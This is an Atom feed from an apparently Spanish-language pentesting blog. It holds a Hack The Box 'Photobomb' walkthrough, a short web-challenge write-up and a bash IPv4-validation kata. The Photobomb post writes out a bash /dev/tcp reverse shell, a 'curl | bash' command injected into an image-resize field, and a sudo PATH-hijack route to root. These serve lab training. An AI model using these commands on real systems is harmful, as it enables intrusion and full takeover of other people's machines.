<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-07-31T02:17:50+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">M3f1s7o Blog</title><subtitle>Pentesting y Linux</subtitle><author><name>Jimmy Mendoza</name></author><entry><title type="html">Photobomb</title><link href="http://localhost:4000/photobomb/" rel="alternate" type="text/html" title="Photobomb" /><published>2023-07-30T00:00:00+00:00</published><updated>2023-07-30T00:00:00+00:00</updated><id>http://localhost:4000/photobomb</id><content type="html" xml:base="http://localhost:4000/photobomb/"><![CDATA[<h1 id="photobomb-walkthrough">Photobomb Walkthrough</h1>

<p><a href="https://app.hackthebox.com/machines/500">Enlace a la máquina</a></p>

<h2 id="reconocimiento">Reconocimiento</h2>
<p>Empezaremos con un reconocimiento de los puertos usando nmap.</p>
<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-vvv</span> <span class="nt">-oN</span> all_ports 10.10.11.182
<span class="go">Nmap scan report for 10.10.11.182  
Host is up, received user-set (0.079s latency).  
Scanned at 2023-07-26 09:26:36 CST for 13s  
Not shown: 65533 closed tcp ports (reset)  
PORT   STATE SERVICE REASON  
22/tcp open  ssh     syn-ack ttl 63  
80/tcp open  http    syn-ack ttl 63  
  
Read data files from: /usr/bin/../share/nmap  
</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Wed Jul 26 09:26:49 2023 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.75 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Ahora, vamos a lanzar un escaneo más a detalle sobre el puerto <code class="language-plaintext highlighter-rouge">80</code> y el <code class="language-plaintext highlighter-rouge">22</code>.</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-oN</span> targeted 10.10.11.182
<span class="go">Nmap scan report for 10.10.11.182
Host is up (0.081s latency).

PORT   STATE SERVICE VERSION
</span><span class="gp">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Wed Jul 26 09:28:00 2023 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.54 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="página-web">Página web</h3>
<p>Al parecer tenemos una página web llamada <code class="language-plaintext highlighter-rouge">photobomb.htb</code>, vamos a escribir la <code class="language-plaintext highlighter-rouge">ip</code> de la máquina en el navegador.
<img src="/assets/images/maquinas/Pasted image 20230727085142.png" alt="image" /></p>

<p>El servidor nos indica que hay un sitio con dirección <code class="language-plaintext highlighter-rouge">photobomb.htb</code> pero no lo está resolviendo, por lo que vamos a agregar la dirección a nuestra lista de hosts:</p>
<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"10.10.11.182 photobomb.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts  
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Ahora, si recargamos la página, ya podemos ver el sitio <code class="language-plaintext highlighter-rouge">photobomb.htb</code>:
<img src="/assets/images/maquinas/Pasted image 20230727085450.png" alt="image" /></p>

<p>El único enlace que se nos presenta nos abre un dialogo de acceso, de la cual no pasamos tratando de adivinar las credenciales. Si damos en cancelar, nos redirige a la ruta <code class="language-plaintext highlighter-rouge">/printer</code> con error <code class="language-plaintext highlighter-rouge">401</code>.</p>

<p><img src="/assets/images/maquinas/Pasted image 20230727090009.png" alt="image" /></p>

<h4 id="código-fuente">Código fuente</h4>
<p>Vamos a ver el código fuente de la página, a veces hay cosas interesantes ahí.
<img src="/assets/images/maquinas/Pasted image 20230727090404.png" alt="image" /></p>

<p>Podemos ver que hay un script en la línea 6 llamado <code class="language-plaintext highlighter-rouge">photobomb.js</code>, vamos a ver qué se esconde ahí.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
  <span class="c1">// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me</span>
  <span class="nf">if </span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/^</span><span class="se">(</span><span class="sr">.*;</span><span class="se">)?\s</span><span class="sr">*isPhotoBombTechSupport</span><span class="se">\s</span><span class="sr">*=</span><span class="se">\s</span><span class="sr">*</span><span class="se">[^</span><span class="sr">;</span><span class="se">]</span><span class="sr">+</span><span class="se">(</span><span class="sr">.*</span><span class="se">)?</span><span class="sr">$/</span><span class="p">))</span> <span class="p">{</span>
    <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByClassName</span><span class="p">(</span><span class="dl">'</span><span class="s1">creds</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">href</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">http://pH0t0:b0Mb!@photobomb.htb/printer</span><span class="dl">'</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">init</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Al parecer, lo que hace este script es dar el ingreso a los usuarios que tengan una cookie llamada <em>isPhotoBombTechSupport</em>, y los redirige a una url con las credenciales de acceso en ella. Así que podemos ir nosotros a esa misma url, o ingresar <code class="language-plaintext highlighter-rouge">pH0t0</code> como usuario y <code class="language-plaintext highlighter-rouge">b0Mb!</code> como contraseña.</p>

<p><img src="/assets/images/maquinas/Pasted image 20230727091021.png" alt="image" /></p>

<h4 id="printer">Printer</h4>
<p>Y tenemos acceso a <code class="language-plaintext highlighter-rouge">/printer</code>. La funcionalidad de esta página parece ser para re escalar imágenes que luego podemos descargar para imprimir, de hecho si seleccionamos una imagen y un tamaño, podemos descargar la imagen a nuestro equipo.</p>

<p><img src="/assets/images/maquinas/Pasted image 20230727091159.png" alt="image" /></p>

<p>Una de las cosas que observé fue que la primera vez que seleccionas una resolución diferente a la que está por default, la página tarda un poco en tener lista la descarga, pero la segunda vez que solicitas la imagen es inmediata la descarga, sospecho que se trata de un re escalamiento por medio de un comando, que tarda unos segundos en procesar la imagen al tamaño deseado, y guarda las copias temporalmente.</p>

<h3 id="burp-suite">Burp Suite</h3>

<p>Vamos a usar el proxy de Burp Suite para ver las peticiones que se están enviando.
<img src="/assets/images/maquinas/Pasted image 20230727091704.png" alt="image" /></p>

<p>Y una vez tengamos la petición, la mandamos al Repeater.</p>

<p><img src="/assets/images/maquinas/Pasted image 20230727091857.png" alt="image" /></p>

<p>Observamos tres campos que se están mandando:</p>
<ol>
  <li>El nombre de la imagen</li>
  <li>El tipo</li>
  <li>Y las dimensiones</li>
</ol>

<p>Puede ser que en el servidor se esté ejecutando un comando que utilice esos 3 argumentos para generar la imagen, algo así como:</p>
<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>resize <span class="nt">-n</span> <span class="s2">"mark-mc-neill-4xWHIpY2QcY-unsplash.jpg"</span> <span class="nt">-t</span> <span class="s2">"jpg"</span> <span class="nt">-s</span> <span class="s2">"30x20"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Esto no nos permitiría inyectar comandos, porque lo que introduzcamos estaría siendo tomado como cadena, pero si el comando luce más como:</p>
<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>resize <span class="nt">-n</span> mark-mc-neill-4xWHIpY2QcY-unsplash.jpg <span class="nt">-t</span> jpg <span class="nt">-s</span> 30x20
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Habría una vulnerabilidad a inyección de comandos, por lo que si introducimos un <code class="language-plaintext highlighter-rouge">;</code> muy probablemente causaremos un error en el proceso. Probemos uno por uno.</p>

<p>El único campo que parece ser vulnerable es el <code class="language-plaintext highlighter-rouge">filetype</code>, cuando insertamos un punto y coma, el servidor tarda en responder y finalmente nos dice que <em>falló en generar una copia de la imagen</em>, diferente a la respuesta que obteníamos con los otros campos.</p>

<p><img src="/assets/images/maquinas/Pasted image 20230727093219.png" alt="image" /></p>

<p>Pero para estar seguros insertemos un comando que nos pueda dar una señal de que se está ejecutando, pues no obtendremos respuesta en formato de texto. Usemos <code class="language-plaintext highlighter-rouge">sleep</code>, si se ejecuta conseguiremos que el servidor tarde <code class="language-plaintext highlighter-rouge">x</code> tiempo en responder. Inyectemos <code class="language-plaintext highlighter-rouge">;sleep+15</code> (el <code class="language-plaintext highlighter-rouge">+</code> sustituye al espacio).</p>

<p>Y efectivamente, el servidor tarda &gt; 15 segundos en responder. Tenemos una inyección de comandos.</p>

<hr />
<h2 id="ataque">Ataque</h2>
<p>Con esta vulnerabilidad deberíamos buscar una reverse shell que nos deje entrar al equipo.</p>

<h3 id="reverse-shell">Reverse shell</h3>
<h4 id="script-para-la-reverse">Script para la reverse</h4>
<p>Vamos a crear un archivo <code class="language-plaintext highlighter-rouge">index.html</code> que podamos servir a través de un servidor <code class="language-plaintext highlighter-rouge">http</code>, y que contenga el script para la reverse shell:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>bash -c "bash -i &gt;<span class="err">&amp;</span> /dev/tcp/10.10.14.13/4040 0&gt;<span class="err">&amp;</span>1"
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="servidor-http">Servidor http</h4>
<p>En el directorio donde se encuentra <code class="language-plaintext highlighter-rouge">index.html</code> vamos a ejecutar:</p>
<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python <span class="nt">-c</span> http.server 80
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="nc">nc</h4>
<p>Y vamos a escuchar a conexiones entrantes con <code class="language-plaintext highlighter-rouge">nc</code>:</p>
<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-nlvp</span> 4040
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/images/maquinas/Pasted image 20230727094651.png" alt="image" /></p>

<h4 id="inyección">Inyección</h4>
<p>Es momento de inyectar el comando que nos de la reverse shell: <code class="language-plaintext highlighter-rouge">;curl+10.10.14.10+|+bash</code>.</p>

<p><img src="/assets/images/maquinas/Pasted image 20230727095256.png" alt="image" /></p>

<p>Tenemos una reverse, ahora faltaría acondicionarla.</p>

<h3 id="primer-bandera">Primer bandera</h3>
<p>La encontramos en nuestro directorio home.
<img src="/assets/images/maquinas/Pasted image 20230727100105.png" alt="image" /></p>

<hr />
<h2 id="escalamiento">Escalamiento</h2>
<p>Veamos si tenemos algún permiso como <code class="language-plaintext highlighter-rouge">sudo</code> o estamos en algún grupo privilegiado.</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>  
<span class="go">uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)  
</span><span class="gp">$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>  
<span class="go">Matching Defaults entries for wizard on photobomb:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User wizard may run the following commands on photobomb:  
   (root) SETENV: NOPASSWD: /opt/cleanup.sh
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Ningún grupo importante, pero vemos que podemos ejecutar el script <code class="language-plaintext highlighter-rouge">cleanup.sh</code> como root sin utilizar contraseña (<code class="language-plaintext highlighter-rouge">NOPASSWD</code>) y conservando nuestro <code class="language-plaintext highlighter-rouge">PATH</code> (<code class="language-plaintext highlighter-rouge">SETENV</code>). Lo que ya nos da una idea de <strong>PATH hijacking</strong>. Pero veamos el script <code class="language-plaintext highlighter-rouge">cleanup.sh</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash  </span>
<span class="nb">.</span> /opt/.bashrc  
<span class="nb">cd</span> /home/wizard/photobomb  
  
<span class="c"># clean up log files  </span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-s</span> log/photobomb.log <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="o">[</span> <span class="nt">-L</span> log/photobomb.log <span class="o">]</span>  
<span class="k">then</span>  
 /bin/cat log/photobomb.log <span class="o">&gt;</span> log/photobomb.log.old  
 /usr/bin/truncate <span class="nt">-s0</span> log/photobomb.log  
<span class="k">fi</span>  
  
<span class="c"># protect the priceless originals  </span>
find source_images <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s1">'*.jpg'</span> <span class="nt">-exec</span> <span class="nb">chown </span>root:root <span class="o">{}</span> <span class="se">\;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Este script carga su configuración de un <code class="language-plaintext highlighter-rouge">.bashrc</code> ubicado en el mismo directorio y luego hace una copia del <code class="language-plaintext highlighter-rouge">photobomb.log</code>, por último, con <code class="language-plaintext highlighter-rouge">find</code> protege las imágenes originales.</p>

<p>Revisemos <code class="language-plaintext highlighter-rouge">.bashrc</code>:</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>System-wide .bashrc file <span class="k">for </span>interactive bash<span class="o">(</span>1<span class="o">)</span> shells.  
<span class="go">  
</span><span class="gp">#</span><span class="w"> </span>To <span class="nb">enable </span>the settings / commands <span class="k">in </span>this file <span class="k">for </span>login shells as well,  
<span class="gp">#</span><span class="w"> </span>this file has to be sourced <span class="k">in</span> /etc/profile.  
<span class="go">  
</span><span class="gp">#</span><span class="w"> </span>Jameson: ensure that snaps don<span class="s1">'t interfere, '</span>cos they are dumb  
<span class="gp">PATH=$</span><span class="o">{</span>PATH/:<span class="se">\/</span>snap<span class="se">\/</span>bin/<span class="o">}</span>  
<span class="go">  
</span><span class="gp">#</span><span class="w"> </span>Jameson: caused problems with testing whether to rotate the log file  
<span class="gp">enable -n [ #</span><span class="w"> </span><span class="o">]</span>  
<span class="go">  
</span><span class="gp">#</span><span class="w"> </span>If not running interactively, don<span class="s1">'t do anything  
</span><span class="gp">[ -z "$</span><span class="s1">PS1" ] &amp;&amp; return  
</span><span class="go">  
</span><span class="gp">#</span><span class="w"> </span>check the window size after each <span class="nb">command </span>and, <span class="k">if </span>necessary,  
<span class="gp">#</span><span class="w"> </span>update the values of LINES and COLUMNS.  
<span class="go">shopt -s checkwinsize  
  
-- SNIP --
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Ninguno de estos dos archivos tiene permisos de escritura, por lo que debe haber una forma de ganar acceso al <code class="language-plaintext highlighter-rouge">root</code> <strong>con solamente ejecutarlos</strong>. Algo raro que se hace en <code class="language-plaintext highlighter-rouge">.bashrc</code> es lo que está en la <em>línea 10</em>: <code class="language-plaintext highlighter-rouge">enable -n [</code>, lo que esto hace es deshabilitar el comando <code class="language-plaintext highlighter-rouge">[</code> (sí, el corchete es un comando).</p>

<p><img src="/assets/images/maquinas/Pasted image 20230727103119.png" alt="image" /></p>

<p>Así que, cuando se ejecuta el script <code class="language-plaintext highlighter-rouge">cleanup.sh</code>, el binario <code class="language-plaintext highlighter-rouge">[</code> nativo no será ejecutado, dándonos oportunidad de especificar la ruta de un binario con el mismo nombre, pero que nos sea más útil.</p>

<h3 id="ejecutable-malicioso">Ejecutable malicioso</h3>
<p>Creemos un ejecutable llamado <code class="language-plaintext highlighter-rouge">[</code> que será el que se ejecute cuando lancemos el script como <strong>root</strong>. Su contenido será una simple llamada a una <code class="language-plaintext highlighter-rouge">bash</code>, que se ejecutará bajo el mismo usuario que el script, es decir, <strong>root</strong>.</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /tmp
<span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> <span class="o">&gt;</span> <span class="o">[</span>
<span class="go">bash
^C
</span><span class="gp">$</span><span class="w"> </span><span class="nb">chmod</span> +x <span class="o">[</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Ahora, lo que queda hacer es lanzar el script <strong>incluyendo en el <code class="language-plaintext highlighter-rouge">PATH</code></strong> la ruta de nuestro ejecutable malicioso en primer lugar para garantizar que se ejecute antes de cualquier otro binario con el mismo nombre:</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span> /opt/cleanup.sh
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="segunda-bandera">Segunda bandera</h3>
<p>Boom. Tenemos una bash como usuario root.</p>

<p><img src="/assets/images/maquinas/Pasted image 20230727104551.png" alt="image" /></p>]]></content><author><name>Jimmy Mendoza</name></author><category term="maquina" /><category term="maquinas" /><category term="linux" /><category term="hackthebox" /><category term="easy" /><category term="pentesting" /><category term="path_hijacking" /><category term="inyeccion" /><summary type="html"><![CDATA[Máquina de Hack The Box en donde se explota una vulnerabiliad de inyección de comandos, y se hace PATH hijacking para obtner privilegios de super usuario.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/" /><media:content medium="image" url="http://localhost:4000/" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Trapped Source</title><link href="http://localhost:4000/trapped-source/" rel="alternate" type="text/html" title="Trapped Source" /><published>2023-07-30T00:00:00+00:00</published><updated>2023-07-30T00:00:00+00:00</updated><id>http://localhost:4000/trapped-source</id><content type="html" xml:base="http://localhost:4000/trapped-source/"><![CDATA[<h1 id="trapped-source">Trapped Source</h1>

<p><a href="https://app.hackthebox.com/challenges/491">Enlace del reto</a></p>

<p>La dirección que se nos proporciona en este reto nos lleva a la siguiente página web:</p>

<p><img src="/assets/images/maquinas/locked.png" alt="locked" /></p>

<p>La cual es una caja fuerte de la cual necesitamos encontrar la combinación. Probando algunas de las más obvias, vemos que no va a ser una tarea sencilla si tratamos de adivinar. Por eso, vamos a ver el código fuente de la página:</p>

<h2 id="código-fuente">Código fuente</h2>

<p><img src="/assets/images/maquinas/source_code.png" alt="source" /></p>

<p>El script <code class="language-plaintext highlighter-rouge">script.js</code> luce interesante, vamos analizarlo.</p>

<h2 id="javascript">javascript</h2>
<p><img src="/assets/images/maquinas/script.js.png" alt="script" /></p>

<p>Un vistazo a la lógica del código nos dice que este script es el que valida nuestro intento de acceder, y el que nos va a dar la bandera una vez hayamos acertado. En resumidas cuentas:</p>
<ul>
  <li>si nuestro pin es igual al definido como correcto
    <ul>
      <li>va a enviar una petición <code class="language-plaintext highlighter-rouge">POST</code> a la ruta <code class="language-plaintext highlighter-rouge">/flag</code> con header de tipo de contenido <code class="language-plaintext highlighter-rouge">JSON</code>, y como cuerpo enviará el pin correcto.</li>
    </ul>
  </li>
  <li>si no
    <ul>
      <li>va a mostrar el texto <strong>INVALID!</strong> y va a resetear el pin que pusimos.</li>
    </ul>
  </li>
</ul>

<p><img src="/assets/images/maquinas/acceso_script.png" alt="acceso" /></p>

<h2 id="petición-propia">Petición propia</h2>
<p>Con esta información, podemos empezar a pensar que no es necesario utilizar la página web, podemos hacer la petición desde la terminal utilizando <code class="language-plaintext highlighter-rouge">CURL</code>, agregando cada uno de los campos necesarios. Y como <code class="language-plaintext highlighter-rouge">pin</code> podemos poner cualquier cosa, porque en la petición se envía el pin que ya fue validado.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-sX</span> POST http://138.68.148.72:31634/flag <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data</span> <span class="s1">'{"pin": "  
000"}'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Y de esta manera obtenemos la bandera:</p>

<p><img src="/assets/images/maquinas/bandera_trapped.png" alt="bandera" /></p>]]></content><author><name>Jimmy Mendoza</name></author><category term="retos" /><category term="retos" /><category term="hackthebox" /><category term="pentesting" /><category term="web" /><category term="very_easy" /><summary type="html"><![CDATA[Reto web de Hack The Box]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/" /><media:content medium="image" url="http://localhost:4000/" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">IP Validation</title><link href="http://localhost:4000/ip-validation/" rel="alternate" type="text/html" title="IP Validation" /><published>2023-06-25T00:00:00+00:00</published><updated>2023-06-25T00:00:00+00:00</updated><id>http://localhost:4000/ip-validation</id><content type="html" xml:base="http://localhost:4000/ip-validation/"><![CDATA[<h1 id="ip-validation">IP Validation</h1>

<p><a href="https://www.codewars.com/kata/515decfd9dcfc23bb6000006/shell">Enlace al Kata</a></p>

<h2 id="resumen">Resumen</h2>
<p>En este Kata lo que tenemos que hacer es comprobar el correcto formato de direcciones <a href="https://es.wikipedia.org/wiki/IPv4">IPv4</a>. Simplemente eso.</p>

<hr />
<h2 id="instrucciones-traducidas">Instrucciones (traducidas)</h2>

<p>Escribe un algoritmo que identifique direcciones IPv4 válidas en formato punto decimal. Las IPs serán consideradas válidas si consisten de cuatro octetos, con valores entre <code class="language-plaintext highlighter-rouge">0</code> y <code class="language-plaintext highlighter-rouge">255</code>.</p>

<h4 id="ejemplos-de-entradas-válidas">Ejemplos de entradas válidas</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>Examples of valid inputs:
1.2.3.4
123.45.67.89
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="ejemplo-de-entradas-no-válidas">Ejemplo de entradas no válidas</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>1.2.3
1.2.3.4.5
123.456.78.90
123.045.067.089
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="notas">Notas</h4>

<ul>
  <li>Ceros al principio (ej. <code class="language-plaintext highlighter-rouge">01.02.03.04</code>) son considerados inválidos</li>
  <li>Se garantiza que la entradas es una sóla cadena</li>
</ul>

<hr />
<h2 id="soluciones">Soluciones</h2>
<h3 id="mi-solución">Mi solución</h3>

<p>En esta solución no pondré algoritmo porque es un enfoque muy lineal, una condicional para cada requisito, si se cumple pasa a la siguiente condicional, sino termina el programa con un <code class="language-plaintext highlighter-rouge">False</code>, si el programa llega al final termina con un <code class="language-plaintext highlighter-rouge">True</code>.</p>

<h4 id="código">Código</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="nv">adr</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>

<span class="nv">re</span><span class="o">=</span><span class="s2">"^[0-9.]+$"</span>
<span class="o">!</span> <span class="o">[[</span> <span class="nv">$adr</span> <span class="o">=</span>~ <span class="nv">$re</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"False"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span>  <span class="c"># sólo números y puntos</span>

<span class="nv">IFS</span><span class="o">=</span><span class="s2">"."</span> <span class="nb">read</span> <span class="nt">-ra</span> octet <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$adr</span><span class="s2">"</span>  <span class="c"># separar por puntos</span>
<span class="o">[[</span> <span class="k">${#</span><span class="nv">octet</span><span class="p">[@]</span><span class="k">}</span> <span class="nt">-ne</span> 4 <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"False"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span>  <span class="c"># 4 octetos</span>


<span class="k">for </span>oct <span class="k">in</span> <span class="k">${</span><span class="nv">octet</span><span class="p">[@]</span><span class="k">}</span><span class="p">;</span> <span class="k">do</span>
  <span class="o">!</span> <span class="o">[[</span> <span class="k">${#</span><span class="nv">oct</span><span class="k">}</span> <span class="nt">-le</span> 3 <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"False"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span>  <span class="c"># 3 o menos digitos en cada octeto</span>
  <span class="o">!</span> <span class="o">[[</span> <span class="nv">$oct</span> <span class="nt">-ge</span> 0 <span class="o">&amp;&amp;</span> <span class="nv">$oct</span> <span class="nt">-le</span> 255 <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"False"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span>  <span class="c"># rango de 0 a 255 </span>
  <span class="o">[[</span> <span class="nv">$oct</span> <span class="o">=</span>~ ^0[1-9]+<span class="nv">$ </span><span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"False"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span>  <span class="c"># ceros al principio</span>

<span class="k">done

</span><span class="nb">echo</span> <span class="s2">"True"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Es una solución sencilla y fácil de entender, utilicé la sintáxis que aprendí en la <a href="https://m3f1s7o.github.io/prize-draw/#otras-soluciones">solución del anterior Kata</a> para hacer las verificaciones necesarias, y lo combiné con <a href="https://www.howtogeek.com/661101/how-to-use-regular-expressions-regexes-on-linux/">expresiones regulares (<code class="language-plaintext highlighter-rouge">regex</code>)</a>.</p>

<p>Sin embargo, viendo otras soluciones, encontré maneras de hacer el problema en menos líneas.</p>

<hr />
